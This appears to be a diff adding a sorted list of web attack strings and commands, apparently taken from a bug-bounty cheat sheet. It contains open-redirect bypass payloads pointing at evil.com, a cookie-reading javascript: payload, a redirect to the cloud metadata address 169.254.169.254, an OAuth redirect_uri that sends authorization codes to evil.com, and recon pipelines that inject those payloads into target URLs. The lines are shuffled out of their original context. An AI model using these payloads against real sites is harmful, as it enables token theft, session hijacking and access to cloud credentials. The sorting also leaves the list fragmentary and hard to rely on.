@@ -1,0 +1,33 @@
+%2Fevil.com
+/\evil.com
+/fetch?url=https://attacker.com/redirect-to-metadata
+GET /fetch?url=
+GET /login?next=/dashboard
+GET /login?next=\\evil.com
+GET /logout?returnTo=https://evil.com
+GET /redirect?url=https://evil.com
+GET /redirect?url=javascript:alert(document.cookie)
+HTTP/1.1 302 Found
+Location: http://169.254.169.254/latest/meta-data/
+POST /api/oauth/callback
+\\evil.com
+cat recon/target/urls.txt | gf redirect | \
+client_id=CLIENT_ID&
+evil.com%00target.com
+evil.com%09
+http://
+https://
+https://evil.com
+https://evil.com#.target.com
+https://evil.com/?code=AUTH_CODE
+https://target.com/*
+https://target.com/oauth/authorize?
+https://target.com/redirect?url=https://target.com@evil.com
+https://target.com@evil.com
+nuclei -u https://target.com -t redirect/ -severity medium,high
+openredirex -l recon/target/redirect-candidates.txt -p https://evil.com
+qsreplace "https://evil.com" | \
+redirect_uri=https://target.com/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com
+ref=https://evil.com
+response_type=code&
+{"redirect_url": "https://target.com/dashboard?ref=USER_CONTROLLED_VALUE"}
